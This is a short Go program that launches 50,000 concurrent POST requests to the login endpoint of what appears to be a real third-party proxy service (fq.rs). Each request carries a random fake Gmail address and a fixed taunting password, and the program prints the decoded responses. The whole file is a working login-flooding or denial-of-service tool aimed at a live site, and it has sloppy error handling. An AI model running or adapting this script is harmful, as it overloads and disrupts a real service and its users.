package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func main() {
	ch2 := make(chan interface{})
	for i := 0; i < 50000; i++ {

		go httpPostForm(string(rand.Int())+"@gmail.com", ch2)
	}
	i := 0
	for {
		select {
		case u := <-ch2:
			println(u)
			i = 0
		default:
			println("ok")
			if i > 10 {
				goto Loop
			}
			i++
			time.Sleep(time.Second)
		}
	}
Loop:
	print("执行完成")
}
func zhToUnicode(raw []byte) ([]byte, error) {
	str, err := strconv.Unquote(strings.Replace(strconv.Quote(string(raw)), `\\u`, `\u`, -1))
	if err != nil {
		return nil, err
	}
	return []byte(str), nil
}
func httpPostForm(email string, chanel chan interface{}) {
	chanel <- email
	resp, err := http.PostForm("https://fq.rs/api/v1/passport/auth/login",
		url.Values{"key": {"value"}, "email": {email}, "password": {"fkairport1314"}})
	if err != nil {
		// handle error
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		// handle error
	}
	textQuoted := string(body)
	println(textQuoted)
	textUnquoted := textQuoted[1 : len(textQuoted)-1]
	sUnicodev := strings.Split(textUnquoted, "\\u")
	var context string
	for _, v := range sUnicodev {
		if len(v) < 1 {
			continue
		}
		temp, err := strconv.ParseInt(v, 16, 32)
		if err != nil {
			panic(err)
		}
		context += fmt.Sprintf("%c", temp)
	}
	fmt.Println(context)

	chanel <- context

}
